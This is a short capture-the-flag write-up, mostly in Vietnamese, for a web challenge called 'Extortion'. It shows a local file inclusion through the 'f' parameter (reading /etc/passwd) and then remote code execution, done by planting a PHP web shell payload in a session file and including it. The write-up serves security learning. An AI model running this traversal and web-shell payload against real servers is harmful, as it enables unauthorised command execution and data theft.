Extortion
===
### Description
We finished building sturdy space ships. Its time to get on-board and wipe enemy bases.

### Solution
Ở chall này chúng ta không được cung cấp source vì vậy chúng ta phải tự fuzz để xem có thể khai thác như nào. Khi chúng ta click vào home, airship, flying saucer và chú ý url thì thấy được `?f=fs.php` => có tham số f và chúng ta có thể control nó. Mình nghĩ có lẽ là lfi nên mình thử payload đơn giản `../../../etc/passwd` thì ta nhận được một trang trắng bật mã nguồn lên kiếm tra thì thấy được nó có đọc được /etc/passwd => thử đọc file fs.php. 
Kết quả
![image](https://user-images.githubusercontent.com/54855855/115966461-d9381080-a557-11eb-8f0b-ac801bdd879a.png)
=> code trong chương trình có vẻ như `include(file/input)` và chúng ta cũng không thể đọc được source từ cách này. 
Mình thấy ở chương trình có `send.php` nhưng không biết nó làm gì và nhiệm vụ của nó là gì. Sau đó mình nghĩ có lẽ là thử `session upload process` thì vẫn không work. Stuck khá lâu thì bạn của mình thử lại session upload process thì work lmaooo :) và biết được input ở send.php được lưu tại `/tmp/sess_sessid`.
![image](https://user-images.githubusercontent.com/54855855/115967494-194dc200-a55d-11eb-89ba-085040f24ac8.png)
Khi send name=taidh sau đó ![image](https://user-images.githubusercontent.com/54855855/115967523-4306e900-a55d-11eb-9013-b02940a260dd.png) kiểm tra lại với payload này thì nhận thấy được taidh có nằm ở trong này => chỉ cần up một shell vô đây là có thể rce nó.

### Payload
`name=<?php+system($_GET['cmd'])+?>`
Sau đó `?f=../../../../tmp/sess_2a4040b8d6ca80991427fe1b1ceec39f?cmd=ls`